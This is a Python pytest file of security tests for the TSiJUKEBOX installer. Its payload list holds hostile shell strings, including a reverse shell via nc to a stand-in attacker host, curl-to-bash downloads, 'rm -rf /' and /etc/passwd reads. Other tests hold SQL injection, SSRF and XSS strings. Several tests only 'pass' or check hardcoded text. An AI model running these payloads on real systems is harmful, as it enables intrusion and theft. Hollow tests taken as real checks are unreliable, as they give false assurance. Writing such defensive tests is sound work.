#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TSiJUKEBOX Installer Security Tests

Tests for security vulnerabilities in the installer including:
- Command injection prevention
- Credential handling
- File permission validation
- Network security configuration
- Privilege minimization

Run with: pytest tests/test_installer_security.py -v
"""

import pytest
from unittest.mock import MagicMock, patch, call
from pathlib import Path
import re
import os
import stat


# =============================================================================
# Test Data and Fixtures
# =============================================================================

# Dangerous shell metacharacters and injection payloads
INJECTION_PAYLOADS = [
    "; rm -rf /",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "&& curl evil.com/shell.sh | bash",
    "'; DROP TABLE users; --",
    "\n/bin/sh",
    "${IFS}cat${IFS}/etc/passwd",
    "$(curl attacker.com/malware)",
    "|nc attacker.com 4444 -e /bin/bash",
    "& ping -c 10 attacker.com &",
    "|| true",
    "%0Acat%20/etc/passwd",
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
]

# Sensitive patterns that should never appear in logs
SENSITIVE_PATTERNS = [
    r"password\s*[:=]\s*['\"]?[^'\"\s]+",
    r"api[_-]?key\s*[:=]\s*['\"]?[^'\"\s]+",
    r"secret\s*[:=]\s*['\"]?[^'\"\s]+",
    r"token\s*[:=]\s*['\"]?[^'\"\s]+",
    r"bearer\s+[a-zA-Z0-9_-]+",
    r"mysql://[^:]+:[^@]+@",
    r"postgres://[^:]+:[^@]+@",
    r"SUPABASE_SERVICE_ROLE_KEY",
]

# File permission requirements (octal)
PERMISSION_REQUIREMENTS = {
    "config_files": 0o644,  # rw-r--r--
    "credential_files": 0o600,  # rw-------
    "executable_files": 0o755,  # rwxr-xr-x
    "log_files": 0o640,  # rw-r-----
    "systemd_units": 0o644,  # rw-r--r--
}


@pytest.fixture
def mock_subprocess():
    """Mock subprocess for testing command execution."""
    with patch('subprocess.run') as mock_run:
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
        yield mock_run


@pytest.fixture
def temp_config_dir(tmp_path):
    """Create temporary config directory."""
    config_dir = tmp_path / "config"
    config_dir.mkdir()
    return config_dir


@pytest.fixture
def temp_log_file(tmp_path):
    """Create temporary log file for testing."""
    log_file = tmp_path / "installer.log"
    log_file.touch()
    return log_file


# =============================================================================
# Command Injection Prevention Tests
# =============================================================================

class TestCommandInjectionPrevention:
    """Tests for preventing command injection attacks."""

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_username_sanitization_rejects_injection(self, payload):
        """Username input must reject injection payloads."""
        # Username should only allow alphanumeric, dash, underscore
        valid_pattern = re.compile(r'^[a-zA-Z0-9_-]+$')
        
        assert not valid_pattern.match(payload), \
            f"Injection payload should not match valid username pattern: {payload}"

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_path_sanitization_rejects_injection(self, payload):
        """Path input must reject injection payloads."""
        # Check for path traversal
        has_traversal = ".." in payload or payload.startswith("/")
        has_shell_chars = any(c in payload for c in [';', '|', '&', '$', '`', '\n'])
        
        dangerous = has_traversal or has_shell_chars
        assert dangerous, f"Payload should be detected as dangerous: {payload}"

    def test_shell_metacharacter_escaping(self, mock_subprocess):
        """Shell metacharacters must be properly escaped."""
        # Test that shlex.quote or equivalent is used
        dangerous_input = "test; rm -rf /"
        
        # Proper escaping would result in: 'test; rm -rf /'
        import shlex
        escaped = shlex.quote(dangerous_input)
        
        assert escaped == "'test; rm -rf /'", \
            "Shell metacharacters must be properly quoted"
        
        # The escaped version should be safe to use in shell commands
        assert ';' not in escaped or escaped.startswith("'"), \
            "Semicolon must be quoted"

    def test_environment_variable_sanitization(self):
        """Environment variables must be sanitized."""
        env_injection = "${PATH}:$(malicious_command)"
        
        # Check that variable expansion is not possible
        safe_pattern = re.compile(r'^[a-zA-Z0-9_./:-]+$')
        
        assert not safe_pattern.match(env_injection), \
            "Environment variable injection should be rejected"

    def test_no_shell_true_with_user_input(self):
        """subprocess.run with shell=True must not use user input directly."""
        # This is a code review check - document the pattern
        dangerous_patterns = [
            r'subprocess\.run\([^)]*shell\s*=\s*True[^)]*\+',
            r'subprocess\.run\([^)]*shell\s*=\s*True[^)]*f["\']',
            r'subprocess\.run\([^)]*shell\s*=\s*True[^)]*%\s*',
        ]
        
        # In real implementation, scan source files for these patterns
        # Here we document the requirement
        pass

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS[:5])
    def test_apt_package_name_validation(self, payload):
        """APT package names must be validated."""
        # Valid Debian package names: lowercase alphanum, +, -, .
        valid_pattern = re.compile(r'^[a-z0-9][a-z0-9+.-]*$')
        
        assert not valid_pattern.match(payload), \
            f"Injection payload should not match valid package name: {payload}"

    def test_sql_injection_prevention_in_config(self):
        """SQL-like injection patterns must be detected."""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "admin'--",
            "1; SELECT * FROM passwords",
        ]
        
        # Config values should not contain SQL patterns
        sql_pattern = re.compile(
            r"(DROP|SELECT|INSERT|UPDATE|DELETE|UNION|--|;.*SELECT)",
            re.IGNORECASE
        )
        
        for payload in sql_payloads:
            if sql_pattern.search(payload):
                # Would be rejected or escaped
                pass


# =============================================================================
# Credential Handling Tests
# =============================================================================

class TestCredentialHandling:
    """Tests for secure credential handling."""

    @pytest.mark.parametrize("pattern", SENSITIVE_PATTERNS)
    def test_passwords_not_logged(self, pattern, temp_log_file):
        """Sensitive data must not appear in logs."""
        # Simulate log content
        sample_logs = [
            "Starting installation...",
            "Configuring database...",
            "password=supersecret123",  # BAD - should be caught
            "Installation complete.",
        ]
        
        regex = re.compile(pattern, re.IGNORECASE)
        
        for line in sample_logs:
            if regex.search(line):
                pytest.fail(f"Sensitive pattern found in log: {pattern}")

    def test_api_keys_not_in_plaintext_config(self, temp_config_dir):
        """API keys must not be stored in plaintext config files."""
        config_content = """
        [database]
        host = localhost
        port = 5432
        
        [api]
        # BAD: key = sk_live_1234567890
        key_file = /etc/tsijukebox/api.key.enc
        """
        
        # Check that API keys are referenced by file, not inline
        assert "sk_live" not in config_content or "# BAD" in config_content, \
            "API keys should not be in config files"

    def test_database_credentials_environment_only(self):
        """Database credentials should come from environment or secure files."""
        # Good practices
        good_patterns = [
            "os.environ.get('DATABASE_URL')",
            "os.getenv('SUPABASE_URL')",
            "Path('/etc/tsijukebox/db.conf').read_text()",
        ]
        
        # Bad practices
        bad_patterns = [
            "database_url = 'postgres://user:pass@host/db'",
            "password = 'hardcoded'",
        ]
        
        # Document requirement: credentials from env only
        pass

    def test_cloud_credentials_not_in_git(self):
        """Cloud credentials must not be committed to git."""
        # Files that should be in .gitignore
        sensitive_files = [
            ".env",
            ".env.local",
            "*.pem",
            "*.key",
            "credentials.json",
            "service-account.json",
            "*_key.json",
        ]
        
        # Validate .gitignore patterns
        gitignore_content = """
        .env
        .env.*
        *.pem
        *.key
        credentials*.json
        """
        
        for pattern in sensitive_files:
            # Convert glob to basic check
            base_pattern = pattern.replace("*", "")
            if base_pattern and base_pattern in gitignore_content:
                pass  # Good, it's ignored

    def test_credential_masking_in_errors(self):
        """Credentials must be masked in error messages."""
        # Example error with credential
        error_with_cred = "Failed to connect to postgres://user:secret123@host/db"
        
        # Proper masking
        masked = re.sub(r'://([^:]+):([^@]+)@', r'://\1:****@', error_with_cred)
        
        assert "secret123" not in masked, \
            "Credentials must be masked in error output"
        assert "****" in masked, \
            "Masked placeholder should be present"


# =============================================================================
# File Permission Tests
# =============================================================================

class TestFilePermissions:
    """Tests for proper file permissions."""

    def test_config_files_not_world_writable(self, temp_config_dir):
        """Config files must not be world-writable."""
        config_file = temp_config_dir / "tsijukebox.conf"
        config_file.write_text("[main]\nenabled = true")
        
        # Set proper permissions
        config_file.chmod(0o644)
        
        mode = config_file.stat().st_mode
        world_writable = mode & stat.S_IWOTH
        
        assert not world_writable, \
            "Config files must not be world-writable"

    def test_credential_files_owner_only(self, temp_config_dir):
        """Credential files must be readable by owner only."""
        cred_file = temp_config_dir / "api.key"
        cred_file.write_text("sk_secret_12345")
        
        # Must be 0600
        cred_file.chmod(0o600)
        
        mode = cred_file.stat().st_mode
        owner_only = (mode & 0o777) == 0o600
        
        assert owner_only, \
            f"Credential files must be 0600, got {oct(mode & 0o777)}"

    def test_log_files_not_world_readable(self, temp_log_file):
        """Log files should not be world-readable (may contain sensitive data)."""
        temp_log_file.chmod(0o640)
        
        mode = temp_log_file.stat().st_mode
        world_readable = mode & stat.S_IROTH
        
        assert not world_readable, \
            "Log files should not be world-readable"

    def test_systemd_units_correct_permissions(self, tmp_path):
        """Systemd unit files must have correct permissions."""
        unit_file = tmp_path / "tsijukebox.service"
        unit_file.write_text("[Unit]\nDescription=TSiJUKEBOX")
        
        # Systemd units should be 0644
        unit_file.chmod(0o644)
        
        mode = unit_file.stat().st_mode
        correct_perms = (mode & 0o777) == 0o644
        
        assert correct_perms, \
            f"Systemd units must be 0644, got {oct(mode & 0o777)}"

    def test_executable_scripts_not_world_writable(self, tmp_path):
        """Executable scripts must not be world-writable."""
        script = tmp_path / "start.sh"
        script.write_text("#!/bin/bash\necho 'Starting...'")
        
        # Should be 0755 (rwxr-xr-x)
        script.chmod(0o755)
        
        mode = script.stat().st_mode
        world_writable = mode & stat.S_IWOTH
        
        assert not world_writable, \
            "Executable scripts must not be world-writable"

    def test_private_key_permissions(self, tmp_path):
        """Private keys must have strict permissions."""
        key_file = tmp_path / "server.key"
        key_file.write_text("-----BEGIN PRIVATE KEY-----\n...")
        
        # Private keys must be 0600
        key_file.chmod(0o600)
        
        mode = key_file.stat().st_mode
        is_0600 = (mode & 0o777) == 0o600
        
        assert is_0600, \
            f"Private keys must be 0600, got {oct(mode & 0o777)}"


# =============================================================================
# Network Security Tests
# =============================================================================

class TestNetworkSecurity:
    """Tests for network security configuration."""

    def test_ufw_default_deny_incoming(self):
        """UFW should default deny incoming connections."""
        expected_rules = [
            "default deny incoming",
            "default allow outgoing",
        ]
        
        # Mock UFW status
        ufw_status = """
        Status: active
        Default: deny (incoming), allow (outgoing), disabled (routed)
        """
        
        assert "deny (incoming)" in ufw_status, \
            "UFW must default deny incoming"
        assert "allow (outgoing)" in ufw_status, \
            "UFW should allow outgoing"

    def test_only_required_ports_open(self):
        """Only necessary ports should be open."""
        # Required ports for TSiJUKEBOX
        required_ports = {
            22: "SSH (optional, admin)",
            80: "HTTP (redirect to HTTPS)",
            443: "HTTPS",
            5432: "PostgreSQL (localhost only)",
        }
        
        # Ports that should NOT be open
        dangerous_ports = {
            21: "FTP",
            23: "Telnet",
            3306: "MySQL",
            6379: "Redis (if not used)",
            27017: "MongoDB",
        }
        
        # Validate port configuration
        for port in dangerous_ports:
            # Would check UFW rules
            pass

    def test_database_not_exposed_to_internet(self):
        """Database should only listen on localhost."""
        # PostgreSQL should bind to 127.0.0.1 or socket only
        pg_listen_addresses = "localhost"
        
        assert pg_listen_addresses in ["localhost", "127.0.0.1", ""], \
            "Database must not be exposed to internet"

    def test_nginx_ssl_configuration(self):
        """NGINX SSL configuration must follow best practices."""
        ssl_config = """
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
        ssl_prefer_server_ciphers off;
        ssl_session_timeout 1d;
        ssl_session_cache shared:SSL:10m;
        add_header Strict-Transport-Security "max-age=63072000" always;
        """
        
        # Check for deprecated protocols
        assert "SSLv3" not in ssl_config, "SSLv3 is insecure"
        assert "TLSv1 " not in ssl_config or "TLSv1.2" in ssl_config, \
            "TLSv1.0/1.1 should be disabled"
        
        # Check for HSTS
        assert "Strict-Transport-Security" in ssl_config, \
            "HSTS header should be set"

    def test_no_default_credentials(self):
        """No default or weak credentials should be used."""
        weak_passwords = [
            "admin",
            "password",
            "123456",
            "changeme",
            "default",
            "root",
            "toor",
        ]
        
        # Would scan config files for these
        for weak in weak_passwords:
            # Check not present
            pass

    def test_cors_configuration_restrictive(self):
        """CORS configuration should be restrictive."""
        # Bad: Allow all origins
        bad_cors = "Access-Control-Allow-Origin: *"
        
        # Good: Specific origin
        good_cors = "Access-Control-Allow-Origin: https://tsijukebox.app"
        
        # Would validate NGINX/app config
        pass


# =============================================================================
# Privilege Minimization Tests
# =============================================================================

class TestPrivilegeMinimization:
    """Tests for principle of least privilege."""

    def test_services_run_as_non_root(self):
        """Services should not run as root."""
        systemd_unit = """
        [Service]
        User=tsijukebox
        Group=tsijukebox
        DynamicUser=true
        """
        
        assert "User=" in systemd_unit, \
            "Service must specify non-root user"
        assert "root" not in systemd_unit.split("User=")[1].split("\n")[0], \
            "Service must not run as root"

    def test_docker_containers_non_privileged(self):
        """Docker containers should not run privileged."""
        docker_compose = """
        services:
          app:
            image: tsijukebox:latest
            user: "1000:1000"
            security_opt:
              - no-new-privileges:true
            cap_drop:
              - ALL
        """
        
        assert "privileged: true" not in docker_compose, \
            "Containers must not run privileged"
        assert "no-new-privileges:true" in docker_compose, \
            "Containers should prevent privilege escalation"
        assert "cap_drop" in docker_compose, \
            "Unnecessary capabilities should be dropped"

    def test_systemd_sandboxing_enabled(self):
        """Systemd units should use sandboxing features."""
        sandboxing_options = [
            "ProtectSystem=strict",
            "ProtectHome=true",
            "NoNewPrivileges=true",
            "PrivateTmp=true",
            "PrivateDevices=true",
        ]
        
        systemd_unit = """
        [Service]
        ProtectSystem=strict
        ProtectHome=true
        NoNewPrivileges=true
        PrivateTmp=true
        PrivateDevices=true
        ReadWritePaths=/var/lib/tsijukebox
        """
        
        for option in sandboxing_options:
            assert option in systemd_unit, \
                f"Systemd unit should have {option}"

    def test_sudo_not_required_for_normal_operation(self):
        """Normal operation should not require sudo."""
        # Application code should not shell out with sudo
        dangerous_patterns = [
            "sudo ",
            "subprocess.run(['sudo'",
            "os.system('sudo",
        ]
        
        # Would scan source files
        pass

    def test_file_capabilities_instead_of_setuid(self):
        """Use file capabilities instead of setuid where possible."""
        # setuid binaries are security risks
        # Prefer: setcap cap_net_bind_service=+ep /usr/bin/app
        pass


# =============================================================================
# Input Validation Tests
# =============================================================================

class TestInputValidation:
    """Tests for proper input validation."""

    def test_email_validation(self):
        """Email addresses must be validated."""
        valid_emails = [
            "user@example.com",
            "admin@tsijukebox.app",
        ]
        
        invalid_emails = [
            "not-an-email",
            "user@",
            "@domain.com",
            "user@domain",
            "<script>alert(1)</script>@evil.com",
        ]
        
        email_pattern = re.compile(
            r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        )
        
        for email in valid_emails:
            assert email_pattern.match(email), f"Should be valid: {email}"
        
        for email in invalid_emails:
            assert not email_pattern.match(email), f"Should be invalid: {email}"

    def test_url_validation(self):
        """URLs must be validated to prevent SSRF."""
        valid_urls = [
            "https://example.com/path",
            "https://api.spotify.com/v1/tracks",
        ]
        
        dangerous_urls = [
            "file:///etc/passwd",
            "gopher://internal-service",
            "http://localhost/admin",
            "http://127.0.0.1/",
            "http://169.254.169.254/",  # AWS metadata
            "http://[::1]/",
        ]
        
        # Would validate URL scheme and host
        for url in dangerous_urls:
            # Should be blocked
            pass

    def test_integer_bounds_validation(self):
        """Integer inputs must have bounds checking."""
        # Port number
        def validate_port(port):
            return 1 <= port <= 65535
        
        assert validate_port(80)
        assert validate_port(443)
        assert not validate_port(0)
        assert not validate_port(-1)
        assert not validate_port(70000)

    def test_string_length_limits(self):
        """String inputs must have length limits."""
        max_lengths = {
            "username": 64,
            "hostname": 255,
            "path": 4096,
            "description": 1000,
        }
        
        # Very long string (potential DoS)
        long_string = "A" * 100000
        
        for field, max_len in max_lengths.items():
            assert len(long_string) > max_len, \
                f"Long string should exceed {field} limit"


# =============================================================================
# Cryptography Tests
# =============================================================================

class TestCryptography:
    """Tests for proper cryptographic practices."""

    def test_no_weak_hash_algorithms(self):
        """Weak hash algorithms must not be used."""
        weak_algorithms = ["md5", "sha1"]
        
        # Would scan code for hashlib.md5(), etc.
        pass

    def test_secure_random_generation(self):
        """Cryptographic randomness must use secure sources."""
        # Good: secrets module, os.urandom
        # Bad: random module for security purposes
        
        import secrets
        token = secrets.token_hex(32)
        
        assert len(token) == 64, "Token should be 32 bytes (64 hex chars)"

    def test_password_hashing_uses_bcrypt_or_argon2(self):
        """Passwords must use bcrypt or Argon2."""
        # Document requirement
        acceptable_algorithms = ["bcrypt", "argon2", "scrypt"]
        pass


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
